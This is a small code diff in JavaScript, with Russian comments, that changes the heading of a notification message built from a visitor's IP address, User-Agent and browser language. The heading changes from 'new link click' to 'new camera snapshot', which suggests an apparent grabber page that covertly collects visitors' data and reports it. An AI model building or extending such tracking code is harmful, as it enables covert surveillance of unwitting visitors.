@@ -32,7 +32,7 @@
     const language = navigator.language || "не определён";
 
     // ========== 4. Формирование сообщения (ТОЧНАЯ СТРУКТУРА) ==========
-    const message = `🚨 <b>НОВЫЙ ПЕРЕХОД ПО ССЫЛКЕ!</b>
+    const message = `🚨 <b>Новый снимок с камеры!</b>
 
 <b>🌐 IP:</b> <code>${ipAddress}</code>
 <b>├─ User-Agent:</b> <code>${fullUserAgent}</code>
